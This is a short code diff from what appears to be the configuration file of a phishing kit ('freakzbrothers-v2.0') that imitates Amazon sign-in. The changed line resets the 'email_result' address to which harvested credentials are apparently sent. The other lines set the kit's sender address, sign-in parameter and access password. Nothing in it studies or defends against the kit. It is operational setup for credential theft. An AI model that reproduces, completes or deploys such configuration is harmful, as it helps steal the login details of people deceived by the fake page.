@@ -4,7 +4,7 @@ date_default_timezone_set("Asia/Jakarta");
 $randomnumber = rand(1, 100);
 $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
 $config = array(
-    'email_result' => 'support@amazonserviceteam.com',
+    'email_result' => 'testvalidsmtp@yahoo.com',
     'sender_mail' => 'freakzbrothers-v2.0-$randomnumber@freakz.site',
     'site_parameter' => '_signin',
     'site_password' => '_Freakz',
